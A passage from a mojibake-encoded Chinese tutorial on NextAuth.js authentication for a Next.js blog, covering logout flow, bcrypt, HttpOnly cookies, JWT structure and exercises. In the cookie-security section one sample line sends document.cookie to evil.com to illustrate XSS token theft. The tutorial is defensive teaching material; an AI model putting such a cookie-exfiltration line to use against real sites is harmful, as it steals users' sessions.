â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. æœåŠ¡ç«¯æ‰§è¡Œ signOut()                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. NextAuth åˆ é™¤ HttpOnly Cookie                            â”‚
â”‚    Set-Cookie: next-auth.session-token=; Max-Age=0          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. æ¸…é™¤æœåŠ¡ç«¯ session                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 6. é‡å®šå‘åˆ°é¦–é¡µ                                             â”‚
â”‚    redirectTo: '/'                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 7. æµè§ˆå™¨å‘é€æ–°è¯·æ±‚ GET /                                   â”‚
â”‚    Cookie: ï¼ˆæ—  session-tokenï¼‰                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 8. ä¸­é—´ä»¶æ£€æµ‹æ—  Cookie                                      â”‚
â”‚    isLoggedIn = false                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 9. Navbar è°ƒç”¨ auth()                                       â”‚
â”‚    è¿”å› nullï¼ˆæ—  sessionï¼‰                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 10. ä¸æ˜¾ç¤º"æ§åˆ¶å°"é“¾æ¥å’Œç”¨æˆ·ä¿¡æ¯                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## å››ã€å®‰å…¨æœºåˆ¶

### 4.1 å¯†ç å®‰å…¨ï¼ˆbcryptï¼‰

#### åŸç†

```
åŸå§‹å¯†ç : "admin123456"
       â†“
éšæœºç”Ÿæˆç›å€¼: "randomsalt123"
       â†“
ç»„åˆ: "randomsalt123" + "admin123456"
       â†“
å“ˆå¸Œï¼ˆ2^12 = 4096 è½®ï¼‰
       â†“
æœ€ç»ˆç»“æœ: "$2a$12$randomsalt123$hashedpassword..."
          â””â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          ç®—æ³•ç‰ˆæœ¬    ç›å€¼          å®é™…å“ˆå¸Œ
```

#### ä»£ç ç¤ºä¾‹

```typescript
// åˆ›å»ºç”¨æˆ·æ—¶
const password = 'admin123456';
const hashedPassword = await bcrypt.hash(password, 12);
// ç»“æœ: $2a$12$xyz...abc

// ç™»å½•éªŒè¯æ—¶
const inputPassword = 'ç”¨æˆ·è¾“å…¥çš„å¯†ç ';
const storedHash = '$2a$12$xyz...abc';

const isValid = await bcrypt.compare(inputPassword, storedHash);
// bcrypt ä¼šï¼š
// 1. ä» storedHash æå–ç›å€¼ "xyz"
// 2. ä½¿ç”¨ç›¸åŒç›å€¼å“ˆå¸Œ inputPassword
// 3. æ¯”å¯¹ç»“æœ â†’ true/false
```

#### ä¸ºä»€ä¹ˆå®‰å…¨ï¼Ÿ

| ç‰¹æ€§ | è¯´æ˜ |
|------|------|
| **ç›å€¼ï¼ˆSaltï¼‰** | æ¯ä¸ªå¯†ç å“ˆå¸Œéƒ½åŒ…å«ç‹¬ç‰¹çš„éšæœºç›å€¼ï¼Œå³ä½¿å¯†ç ç›¸åŒå“ˆå¸Œä¹Ÿä¸åŒ |
| **æ…¢å“ˆå¸Œ** | Salt rounds = 12 æ„å‘³ç€è®¡ç®— 2^12 = 4096 æ¬¡ï¼Œæå¤§å¢åŠ æš´åŠ›ç ´è§£æˆæœ¬ |
| **å•å‘åŠ å¯†** | æ— æ³•ä»å“ˆå¸Œåæ¨åŸå¯†ç ï¼Œåªèƒ½æ­£å‘éªŒè¯ |
| **é˜²å½©è™¹è¡¨** | ç”±äºæ¯ä¸ªå¯†ç éƒ½æœ‰ç‹¬ç‰¹ç›å€¼ï¼Œé¢„è®¡ç®—çš„å½©è™¹è¡¨æ— æ•ˆ |

---

### 4.2 Cookie å®‰å…¨ï¼ˆHttpOnlyï¼‰

#### Cookie å±æ€§

```http
Set-Cookie: next-auth.session-token=<encrypted-jwt>;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Path=/;
            Max-Age=604800
```

| å±æ€§ | ä½œç”¨ | é˜²æ­¢ä»€ä¹ˆæ”»å‡» |
|------|------|-------------|
| **HttpOnly** | JavaScript æ— æ³•é€šè¿‡ `document.cookie` è®¿é—® | XSS æ”»å‡» |
| **Secure** | ä»…é€šè¿‡ HTTPS ä¼ è¾“ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰ | ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ |
| **SameSite=Lax** | é™åˆ¶è·¨ç«™è¯·æ±‚æ—¶å‘é€ Cookie | CSRF æ”»å‡» |
| **Path=/** | Cookie å¯¹æ‰€æœ‰è·¯å¾„æœ‰æ•ˆ | N/A |
| **Max-Age=604800** | 7 å¤©åè‡ªåŠ¨è¿‡æœŸï¼ˆç§’ï¼‰ | é•¿æœŸåŠ«æŒ |

#### ä¸ºä»€ä¹ˆ HttpOnly é‡è¦ï¼Ÿ

```javascript
// âŒ æ²¡æœ‰ HttpOnlyï¼šJavaScript å¯ä»¥çªƒå– Token
const token = document.cookie; // å¯ä»¥è¯»å–
fetch('https://evil.com', { body: token }); // å‘é€åˆ°æ¶æ„æœåŠ¡å™¨

// âœ… æœ‰ HttpOnlyï¼šJavaScript æ— æ³•è®¿é—®
console.log(document.cookie); // çœ‹ä¸åˆ° next-auth.session-token
```

---

### 4.3 JWT Token å®‰å…¨

#### Token ç»“æ„

JWT ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç”¨ `.` åˆ†éš”ï¼š

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUwN2YxZjc3YmNmODZjZDc5OTQzOTAxMSIsImVtYWlsIjoiYWRtaW5AdGZ0YmxvZy5jb20iLCJuYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDc3MzQ0MDAsImV4cCI6MTcwODMzOTIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          Header                                                        Payload                                                                           Signature
```

#### Headerï¼ˆç®—æ³•å’Œç±»å‹ï¼‰

```json
{
  "alg": "HS256",   // HMAC SHA-256 ç®—æ³•
  "typ": "JWT"      // Token ç±»å‹
}
```

#### Payloadï¼ˆç”¨æˆ·æ•°æ®ï¼‰

```json
{
  "id": "507f1f77bcf86cd799439011",
  "email": "admin@tftblog.com",
  "name": "Admin",
  "role": "admin",
  "iat": 1707734400,  // ç­¾å‘æ—¶é—´ï¼ˆIssued Atï¼‰
  "exp": 1708339200   // è¿‡æœŸæ—¶é—´ï¼ˆExpiration Timeï¼‰
}
```

#### Signatureï¼ˆç­¾åï¼‰

```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  NEXTAUTH_SECRET  // å¯†é’¥
)
```

#### éªŒè¯æµç¨‹

```
1. æ¥æ”¶ JWT
   â†“
2. åˆ†å‰²æˆ headerã€payloadã€signature
   â†“
3. ä½¿ç”¨ç›¸åŒå¯†é’¥é‡æ–°è®¡ç®—ç­¾å
   â†“
4. æ¯”å¯¹è®¡ç®—çš„ç­¾åå’ŒåŸå§‹ç­¾å
   â†“
5. ç›¸åŒ â†’ Token æœªè¢«ç¯¡æ”¹ â†’ éªŒè¯é€šè¿‡
   ä¸åŒ â†’ Token è¢«ä¿®æ”¹ â†’ æ‹’ç»
```

#### ä¸ºä»€ä¹ˆå®‰å…¨ï¼Ÿ

- **æ— æ³•ä¼ªé€ **: æ²¡æœ‰ `NEXTAUTH_SECRET` æ— æ³•ç”Ÿæˆæœ‰æ•ˆç­¾å
- **é˜²ç¯¡æ”¹**: ä¿®æ”¹ payload åç­¾åä¸åŒ¹é…ï¼Œç«‹å³è¢«å‘ç°
- **è‡ªåŒ…å«**: åŒ…å«æ‰€æœ‰å¿…è¦ä¿¡æ¯ï¼Œæ— éœ€æŸ¥è¯¢æ•°æ®åº“
- **æœ‰æ—¶æ•ˆ**: `exp` å­—æ®µç¡®ä¿ Token ä¼šè¿‡æœŸ

---

### 4.4 é˜²æŠ¤æ€»ç»“

| æ”»å‡»ç±»å‹ | é˜²æŠ¤æªæ–½ | å®ç°æ–¹å¼ |
|---------|---------|---------|
| **å¯†ç æ³„éœ²** | bcrypt å“ˆå¸Œ | `AdminSchema.pre('save')` |
| **XSS æ”»å‡»** | HttpOnly Cookie | NextAuth è‡ªåŠ¨è®¾ç½® |
| **CSRF æ”»å‡»** | SameSite=Lax | NextAuth è‡ªåŠ¨è®¾ç½® |
| **Token ä¼ªé€ ** | JWT ç­¾å | NEXTAUTH_SECRET |
| **ä¸­é—´äººæ”»å‡»** | HTTPS + Secure Cookie | ç”Ÿäº§ç¯å¢ƒé…ç½® |
| **æš´åŠ›ç ´è§£** | bcrypt æ…¢å“ˆå¸Œ | Salt rounds = 12 |
| **Session åŠ«æŒ** | Token è¿‡æœŸ | maxAge: 7 å¤© |
| **é‚®ç®±æšä¸¾** | ç»Ÿä¸€é”™è¯¯æ¶ˆæ¯ | "é‚®ç®±æˆ–å¯†ç é”™è¯¯" |

---

## äº”ã€å¸¸è§é—®é¢˜

### Q1: ä¸ºä»€ä¹ˆä½¿ç”¨ JWT è€Œé Database Sessionï¼Ÿ

| æ–¹æ¡ˆ | ä¼˜ç‚¹ | ç¼ºç‚¹ | é€‚ç”¨åœºæ™¯ |
|------|------|------|---------|
| **JWT** | æ— éœ€æ•°æ®åº“æŸ¥è¯¢ï¼Œæ€§èƒ½å¥½ï¼›æ°´å¹³æ‰©å±•å®¹æ˜“ï¼›æ— çŠ¶æ€ | æ— æ³•ä¸»åŠ¨æ’¤é”€ï¼›Token è¾ƒå¤§ï¼ˆCookie å¤§ï¼‰ | å•ç®¡ç†å‘˜ã€ä½æ’¤é”€éœ€æ±‚ |
| **Database** | å¯ä¸»åŠ¨æ’¤é”€ï¼›Token å°ï¼›æ›´çµæ´» | æ¯æ¬¡è¯·æ±‚æŸ¥æ•°æ®åº“ï¼›éœ€è¦å…±äº« session å­˜å‚¨ | å¤šç”¨æˆ·ã€éœ€é¢‘ç¹æ’¤é”€ |

**æœ¬é¡¹ç›®é€‰æ‹© JWT**ï¼šä»…ç®¡ç†å‘˜ä½¿ç”¨ï¼Œæ— éœ€é¢‘ç¹æ’¤é”€ sessionï¼Œæ€§èƒ½ä¼˜å…ˆã€‚

---

### Q2: å¦‚ä½•åœ¨å…¶ä»–é¡µé¢è·å–ç”¨æˆ·ä¿¡æ¯ï¼Ÿ

#### æ–¹æ³• 1: æœåŠ¡ç«¯ç»„ä»¶ï¼ˆæ¨èï¼‰

```typescript
import { auth } from '@/auth';

export default async function Page() {
  const session = await auth();

  if (!session) {
    return <div>æœªç™»å½•</div>;
  }

  return <div>æ¬¢è¿, {session.user.email}</div>;
}
```

#### æ–¹æ³• 2: å®¢æˆ·ç«¯ç»„ä»¶

```typescript
'use client';
import { useSession } from 'next-auth/react';

export default function Component() {
  const { data: session, status } = useSession();

  if (status === 'loading') {
    return <div>åŠ è½½ä¸­...</div>;
  }

  if (!session) {
    return <div>æœªç™»å½•</div>;
  }

  return <div>æ¬¢è¿, {session.user.email}</div>;
}
```

**æ³¨æ„**: å®¢æˆ·ç«¯ç»„ä»¶éœ€è¦åœ¨ `app/layout.tsx` ä¸­åŒ…è£¹ `<SessionProvider>`ï¼š

```typescript
import { SessionProvider } from 'next-auth/react';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        <SessionProvider>
          {children}
        </SessionProvider>
      </body>
    </html>
  );
}
```

---

### Q3: å¦‚ä½•ä¿æŠ¤ API è·¯ç”±ï¼Ÿ

```typescript
import { auth } from '@/auth';
import { NextResponse } from 'next/server';

export async function GET() {
  // éªŒè¯èº«ä»½
  const session = await auth();

  if (!session) {
    return NextResponse.json(
      { error: 'æœªæˆæƒ' },
      { status: 401 }
    );
  }

  // å¯é€‰ï¼šæ£€æŸ¥è§’è‰²
  if (session.user.role !== 'admin') {
    return NextResponse.json(
      { error: 'æƒé™ä¸è¶³' },
      { status: 403 }
    );
  }

  // æ‰§è¡Œä¸šåŠ¡é€»è¾‘...
  return NextResponse.json({ data: '...' });
}
```

---

### Q4: å¦‚ä½•ä¿®æ”¹ Session è¿‡æœŸæ—¶é—´ï¼Ÿ

```typescript
// auth.ts
export const authConfig: NextAuthConfig = {
  session: {
    strategy: 'jwt',
    maxAge: 60 * 60,  // 1 å°æ—¶ï¼ˆç§’ï¼‰
    // maxAge: 30 * 24 * 60 * 60,  // 30 å¤©
    // maxAge: 60 * 60 * 24,        // 24 å°æ—¶
  },
};
```

---

### Q5: å¦‚ä½•æ·»åŠ "è®°ä½æˆ‘"åŠŸèƒ½ï¼Ÿ

```typescript
// login/page.tsx
const [remember, setRemember] = useState(false);

const handleSubmit = async (e) => {
  const result = await signIn('credentials', {
    email,
    password,
    remember,  // ä¼ é€’åˆ° authorize()
    redirect: false,
  });
};

// auth.ts
async authorize(credentials) {
  // ...éªŒè¯é€»è¾‘...

  // æ ¹æ® remember è¿”å›ä¸åŒçš„ user å¯¹è±¡
  return {
    id: admin._id.toString(),
    email: admin.email,
    name: admin.name,
    role: admin.role,
    remember: credentials.remember === 'true',
  };
},

callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.remember = user.remember;
    }
    return token;
  },
},

session: {
  strategy: 'jwt',
  // åŠ¨æ€è®¾ç½®è¿‡æœŸæ—¶é—´
  maxAge: (session) => {
    return session.remember ? 30 * 24 * 60 * 60 : 24 * 60 * 60;
  },
},
```

---

### Q6: å¦‚ä½•ä¸»åŠ¨æ’¤é”€ JWT Tokenï¼Ÿ

JWT æœ¬èº«æ— æ³•æ’¤é”€ï¼ˆæ— çŠ¶æ€ï¼‰ï¼Œä½†æœ‰å‡ ç§è§£å†³æ–¹æ¡ˆï¼š

#### æ–¹æ¡ˆ 1: é»‘åå•ï¼ˆæ•°æ®åº“ï¼‰

```typescript
// åˆ›å»ºé»‘åå•è¡¨
const RevokedTokenSchema = new mongoose.Schema({
  token: String,
  revokedAt: Date,
});

// ä¸­é—´ä»¶æ£€æŸ¥é»‘åå•
export default auth(async (req) => {
  if (req.auth) {
    const token = req.cookies['next-auth.session-token'];
    const isRevoked = await RevokedToken.findOne({ token });

    if (isRevoked) {
      return NextResponse.redirect('/login');
    }
  }

  return NextResponse.next();
});
```

#### æ–¹æ¡ˆ 2: ç¼©çŸ­è¿‡æœŸæ—¶é—´ + Refresh Token

```typescript
session: {
  maxAge: 15 * 60, // 15 åˆ†é’ŸçŸ­æœŸ Token
},

// å®ç° Refresh Token æœºåˆ¶ï¼ˆè¾ƒå¤æ‚ï¼‰
```

#### æ–¹æ¡ˆ 3: ç‰ˆæœ¬å·æœºåˆ¶

```typescript
// Admin æ¨¡å‹æ·»åŠ  tokenVersion
const AdminSchema = new mongoose.Schema({
  tokenVersion: { type: Number, default: 0 },
});

// æ’¤é”€æ—¶å¢åŠ ç‰ˆæœ¬å·
admin.tokenVersion += 1;
await admin.save();

// JWT åŒ…å«ç‰ˆæœ¬å·
callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.version = user.tokenVersion;
    }
    return token;
  },
},

// éªŒè¯æ—¶æ¯”å¯¹ç‰ˆæœ¬å·
async authorize(credentials) {
  // ...
  if (token.version !== admin.tokenVersion) {
    throw new Error('Token å·²å¤±æ•ˆ');
  }
}
```

---

## å…­ã€å®éªŒç»ƒä¹ 

### ç»ƒä¹  1: ä¿®æ”¹ Session è¿‡æœŸæ—¶é—´

**ä»»åŠ¡**: å°† Session æœ‰æ•ˆæœŸæ”¹ä¸º 1 å°æ—¶

<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary>

```typescript
// auth.ts
export const authConfig: NextAuthConfig = {
  session: {
    strategy: 'jwt',
    maxAge: 60 * 60, // 1 å°æ—¶ = 3600 ç§’
  },
};
```

æµ‹è¯•ï¼š
1. ç™»å½•åï¼Œ1 å°æ—¶ååˆ·æ–°é¡µé¢
2. åº”è¯¥è¢«è‡ªåŠ¨é‡å®šå‘åˆ°ç™»å½•é¡µ
</details>

---

### ç»ƒä¹  2: æ·»åŠ ç”¨æˆ·è§’è‰²æƒé™æ£€æŸ¥

**ä»»åŠ¡**: åœ¨ä¸­é—´ä»¶ä¸­æ£€æŸ¥ç”¨æˆ·è§’è‰²ï¼Œé admin æ— æ³•è®¿é—®æ§åˆ¶å°

<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary>

```typescript
// middleware.ts
export default auth((req) => {
  const { pathname } = req.nextUrl;
  const isLoggedIn = !!req.auth;
  const isAdmin = req.auth?.user?.role === 'admin';

  const protectedPaths = ['/dashboard'];
  const isProtectedPath = protectedPaths.some(path =>
    pathname.startsWith(path)
  );

  if (isProtectedPath && !isLoggedIn) {
    return NextResponse.redirect(new URL('/login', req.url));
  }

  // æ–°å¢ï¼šæ£€æŸ¥è§’è‰²
  if (isProtectedPath && isLoggedIn && !isAdmin) {
    return NextResponse.redirect(new URL('/forbidden', req.url));
  }

  return NextResponse.next();
});
```
</details>

---

### ç»ƒä¹  3: åœ¨ JWT ä¸­æ·»åŠ è‡ªå®šä¹‰å­—æ®µ

**ä»»åŠ¡**: åœ¨ JWT Token ä¸­æ·»åŠ  `lastLoginAt` å­—æ®µ

<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary>

```typescript
// auth.ts
callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.id = user.id;
      token.email = user.email;
      token.name = user.name;
      token.role = user.role;

      // æ–°å¢ï¼šè®°å½•ç™»å½•æ—¶é—´
      token.lastLoginAt = new Date().toISOString();
    }
    return token;
  },

  async session({ session, token }) {
    if (token && session.user) {
      session.user.id = token.id;
      session.user.email = token.email;
      session.user.name = token.name;
      session.user.role = token.role;

      // æ–°å¢ï¼šä¼ é€’åˆ° session
      session.user.lastLoginAt = token.lastLoginAt;
    }
    return session;
  },
},

// types/next-auth.d.tsï¼ˆæ‰©å±•ç±»å‹å®šä¹‰ï¼‰
declare module 'next-auth' {
  interface Session {
    user: {
      id: string;
      email: string;
      name: string;
      role: 'admin';
      lastLoginAt: string; // æ–°å¢
    } & DefaultSession['user'];
  }
}
```
</details>

---

### ç»ƒä¹  4: æ·»åŠ ç™»å½•å°è¯•æ¬¡æ•°é™åˆ¶

**ä»»åŠ¡**: 5 æ¬¡ç™»å½•å¤±è´¥åé”å®šè´¦æˆ· 10 åˆ†é’Ÿ

<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary>

```typescript
// models/Admin.ts
const AdminSchema = new mongoose.Schema({
  // ... åŸæœ‰å­—æ®µ
  loginAttempts: { type: Number, default: 0 },
  lockUntil: { type: Date },
});

// æ£€æŸ¥æ˜¯å¦è¢«é”å®š
AdminSchema.methods.isLocked = function() {
  return this.lockUntil && this.lockUntil > Date.now();
};

// å¢åŠ å¤±è´¥æ¬¡æ•°
AdminSchema.methods.incLoginAttempts = async function() {
  // å¦‚æœä¹‹å‰çš„é”å®šå·²è¿‡æœŸï¼Œé‡ç½®è®¡æ•°
  if (this.lockUntil && this.lockUntil < Date.now()) {
    return this.updateOne({
      $set: { loginAttempts: 1 },
      $unset: { lockUntil: 1 },
    });
  }

  const updates = { $inc: { loginAttempts: 1 } };

  // è¾¾åˆ° 5 æ¬¡ï¼Œé”å®š 10 åˆ†é’Ÿ
  if (this.loginAttempts + 1 >= 5 && !this.isLocked()) {
    updates.$set = { lockUntil: Date.now() + 10 * 60 * 1000 };
  }

  return this.updateOne(updates);
};

// é‡ç½®å¤±è´¥æ¬¡æ•°
AdminSchema.methods.resetLoginAttempts = async function() {
  return this.updateOne({
    $set: { loginAttempts: 0 },
    $unset: { lockUntil: 1 },
  });
};

// auth.ts
async authorize(credentials) {
  // ...

  const admin = await Admin.findOne({ email });
  if (!admin) {
    throw new Error('é‚®ç®±æˆ–å¯†ç é”™è¯¯');
  }

  // æ£€æŸ¥æ˜¯å¦è¢«é”å®š
  if (admin.isLocked()) {
    throw new Error('è´¦æˆ·å·²é”å®šï¼Œè¯· 10 åˆ†é’Ÿåå†è¯•');
  }

  const isValid = await admin.comparePassword(credentials.password);

  if (!isValid) {
    // å¢åŠ å¤±è´¥æ¬¡æ•°
    await admin.incLoginAttempts();
    throw new Error('é‚®ç®±æˆ–å¯†ç é”™è¯¯');
  }

  // ç™»å½•æˆåŠŸï¼Œé‡ç½®å¤±è´¥æ¬¡æ•°
  if (admin.loginAttempts > 0) {
    await admin.resetLoginAttempts();
  }

  return { /* ... */ };
}
```
</details>

---

## ä¸ƒã€å­¦ä¹ èµ„æº

### å®˜æ–¹æ–‡æ¡£

- [NextAuth.js v5 æ–‡æ¡£](https://authjs.dev)
- [Next.js App Router](https://nextjs.org/docs/app)
- [Mongoose æ–‡æ¡£](https://mongoosejs.com/docs)
- [bcrypt æ–‡æ¡£](https://github.com/kelektiv/node.bcrypt.js)

### æ¨èé˜…è¯»é¡ºåº

1. **ç†è§£æ¦‚å¿µ**: JWTã€Cookieã€Sessionã€bcrypt
2. **é˜…è¯»ä»£ç **: `auth.ts` â†’ `middleware.ts` â†’ `login/page.tsx`
3. **è¿½è¸ªæµç¨‹**: åœ¨æµè§ˆå™¨ DevTools ä¸­è§‚å¯Ÿç½‘ç»œè¯·æ±‚
4. **ä¿®æ”¹å°è¯•**: æ”¹å˜ session è¿‡æœŸæ—¶é—´ã€æ·»åŠ æ–°å­—æ®µ
5. **å®éªŒç»ƒä¹ **: å®Œæˆä¸Šé¢çš„ 4 ä¸ªç»ƒä¹ 

### è°ƒè¯•æŠ€å·§

1. **å¯ç”¨ NextAuth è°ƒè¯•æ—¥å¿—**
   ```typescript
   // auth.ts
   debug: true,
   ```

2. **æŸ¥çœ‹ Cookie**
   - æ‰“å¼€æµè§ˆå™¨ DevTools
   - Application â†’ Cookies â†’ localhost
   - æŸ¥çœ‹ `next-auth.session-token`

3. **è§£å¯† JWT**
   - è®¿é—® [jwt.io](https://jwt.io)
   - ç²˜è´´ Token æŸ¥çœ‹å†…å®¹

4. **ç›‘æ§ç½‘ç»œè¯·æ±‚**
   - DevTools â†’ Network
   - ç­›é€‰ `/api/auth`
   - æŸ¥çœ‹è¯·æ±‚/å“åº”

---

## é™„å½•ï¼šæ–‡ä»¶ç»“æ„æ€»è§ˆ

```
é¡¹ç›®æ ¹ç›®å½•
â”œâ”€â”€ auth.ts                          # NextAuth é…ç½®ï¼ˆè®¤è¯æ ¸å¿ƒï¼‰
â”œâ”€â”€ middleware.ts                    # è·¯ç”±ä¿æŠ¤
â”œâ”€â”€ .env.local                       # ç¯å¢ƒå˜é‡
â”‚
â”œâ”€â”€ models/
